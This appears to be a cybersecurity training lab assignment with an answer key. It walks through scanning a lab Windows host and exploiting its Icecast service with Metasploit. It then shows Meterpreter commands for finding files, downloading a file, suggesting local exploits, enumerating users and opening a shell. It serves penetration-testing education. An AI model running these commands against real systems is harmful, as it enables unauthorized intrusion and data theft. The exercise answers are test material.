#### Deliverable
ce you complete this assignment, submit your findings in the following document: 

- [Report.docx](Resources/Report.docx)
 
### Instructions

You've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > Answer: `nmap -sS -sV -O 192.168.0.20`

      ![](Images/nmap_scan_target_icecast.png)
 
 
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
   - Run the SearchSploit commands to show available Icecast exploits.
  
     > Answer: `searchsploit icecast`

     ![](Images/searchsploit_icecast.png)

3. Now that we know which exploits are available to us, let's start Metasploit:
 
   - Run the command that starts Metasploit:
    
     > Answer: `msfconsole`

     ![](Images/start_metasploit.png)
 
 
4. Search for the Icecast module and load it for use.
 
   - Run the command to search for the Icecast module:
     
     > Answer: `search icecast`

     ![](Images/search_icecast.png)
 

   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: `use 0` or `use exploit/windows/http/icecast_header`

     ![](Images/use_icecast_module.png)
 
 
5. Set the `RHOST` to the target machine.
 
   - Run the command that sets the `RHOST`:
      
     > Answer: `set RHOST 192.168.0.20`

     ![](Images/set_rhost.png)
 
6. Run the Icecast exploit.
 
   - Run the command that runs the Icecast exploit.
      
     > Answer: `exploit`

     ![](Images/exploit_DVW10.png)
 
   - Run the command that performs a search for the `secretfile.txt` on the target.
      
     > Answer: `search -f *secretfile*.txt`

     ![](Images/search_secretfile.png)
  
 7. You should now have a Meterpreter session open.
 
    - Run the command to performs a search for the `recipe.txt` on the target:

      > Answer: `search -f *recipe*.txt`

      ![](Images/search_recipe.PNG)
 
 
    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:


      > Answer: `download 'c:\Users\IEUsers\Documents\Drinks.recipe.txt'`

      ![](Images/download_drinks_recipe.png)
      
      ![](Images/exfiltrate_files.png)
 

8. You can also use Meterpreter's local exploit suggester to find possible exploits.

 
   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

   > Answer: `run/post/multi/recon/local_exploit_suggester`

   ![](Images/exploit_suggester.png)

 
#### Bonus
  
 
A. Run a Meterpreter post script that enumerates all logged on users.

   > Answer: `run post/windows/gather/enum_logged_on_users`

   ![](Images/enum_logged_on_users.png)
 
     
B. Open a Meterpreter shell. 
 
   > Answer: `shell` & `systeminfo`

    ![](Images/DVW10_systeminfo.png)


 
C. Run the command that displays the target's computer system information:

   > Answer: `sysinfo`

   ![](Images/target_comp_info.png)



---

&copy; 2020 Trilogy Education Services, a 2U Inc Brand.   All Rights Reserved.